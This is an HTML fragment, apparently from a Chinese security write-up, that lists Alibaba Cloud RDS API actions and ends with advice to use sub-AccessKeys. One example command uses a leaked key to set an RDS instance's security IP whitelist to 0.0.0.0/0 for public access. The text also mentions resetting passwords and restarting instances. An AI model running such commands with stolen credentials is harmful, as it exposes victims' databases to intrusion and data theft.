+DescribeOptimizeAdviceOnMissPK               <span class="p">|</span> DescribeOptimizeAdviceOnStorage
+DescribeParameterTemplates                   <span class="p">|</span> DescribeParameters
+DescribeRegions                              <span class="p">|</span> DescribeResourceUsage
+DescribeSQLLogRecords                        <span class="p">|</span> DescribeSQLLogReports
+DescribeSlowLogRecords                       <span class="p">|</span> DescribeSlowLogs
+ExportDBInstance                             <span class="p">|</span> GrantAccountPrivilege
+ImportDBInstance                             <span class="p">|</span> ImportDataForSQLServer
+ImportDatabaseBetweenInstances               <span class="p">|</span> ModifyAccountDescription
+ModifyBackupPolicy                           <span class="p">|</span> ModifyDBDescription
+ModifyDBInstanceDescription                  <span class="p">|</span> ModifyDBInstanceMaintainTime
+ModifyDBInstanceSpec                         <span class="p">|</span> ModifyParameter
+ModifyPostpaidDBInstanceSpec                 <span class="p">|</span> ModifySecurityIps
+PurgeDBInstanceLog                           <span class="p">|</span> ResetAccountPassword
+RestartDBInstance                            <span class="p">|</span> RevokeAccountPrivilege
+SwitchDBInstanceNetType                      <span class="p">|</span> UpgradeDBInstanceEngineVersion
+</pre></div>
+<p>例如：</p>
+<div class="highlight"><pre><span></span>rds ExportDBInstance --DBInstanceId rr-xxxxx --ModifySecurityIps <span class="m">0</span>.0.0.0/0
+</pre></div>
+<p>和Python脚本一样，即可外网链接。</p>
+<p>同样，我们也可以开通一个安全组、修改RDS密码，重启RDS等等操作。</p>
+<p>RDS API<br/>
+<a href="https://help.aliyun.com/document_detail/182821.html?spm=a2c4g.11186623.2.10.4b1b2eb15RxpE2#doc-8073" target="_blank">https://help.aliyun.com/document_detail/182821.html?spm=a2c4g.11186623.2.10.4b1b2eb15RxpE2#doc-8073</a></p>
+<h2 data-content="1" id="2c44803a9c0883d9fdf9a3ee71e23b1c">修复建议</h2>
+<p>1.其实阿里云已经对ACCESSKEY进行分级，各种应用的子key，但是不排除扔有人直接使用ACCESSKEY,使用子key就可以避免掉这些问题。</p>
+</div>
+</div>
